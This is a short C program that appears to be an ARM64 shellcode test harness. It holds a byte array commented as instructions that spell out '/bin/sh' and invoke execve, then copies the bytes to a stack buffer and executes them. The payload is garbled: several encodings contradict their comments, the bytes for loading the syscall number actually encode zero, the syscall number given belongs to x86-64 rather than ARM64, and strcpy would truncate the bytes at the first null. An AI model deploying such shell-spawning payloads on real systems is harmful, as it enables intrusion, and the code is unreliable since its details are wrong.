#include <stdlib.h>
#include <stdio.h>
#include <string.h>

const char code[] =
    "\xe1\x45\x8c\xd2"  // mov x1, #0x622f  ("b/")
    "\x22\x89\x90\xd2"  // mov x2, #0x6869  ("hi")
    "\x63\xcd\x94\xd2"  // mov x3, #0x6e73  ("ns")
    "\x84\x11\x98\xd2"  // mov x4, #0x682f  ("h/")
    "\xe0\x03\x1e\x32"  // orr w0, wzr, #0x2f  ("/")
    "\x10\x00\x00\xf9"  // str x0, [x0]
    "\xe1\x07\x00\xf9"  // str x1, [sp, #8]
    "\xe2\x0f\x00\xf9"  // str x2, [sp, #16]
    "\xe3\x17\x00\xf9"  // str x3, [sp, #24]
    "\xe4\x1f\x00\xf9"  // str x4, [sp, #32]
    "\xe0\x03\x00\x91"  // mov x0, sp       (pointer to "/bin/sh")
    "\x01\x00\x80\xd2"  // mov x1, #0       (argv = NULL)
    "\x02\x00\x80\xd2"  // mov x2, #0       (envp = NULL)
    "\x08\x00\x80\xd2"  // mov x8, #0x3b    (syscall #59 = execve)
    "\x01\x00\x00\xd4"  // svc #0           (invoke syscall)
;

int main(int argc, char **argv)
{
    char buf[sizeof(code)];
    strcpy(buf, code);
    ((void(*)( ))buf)( );
}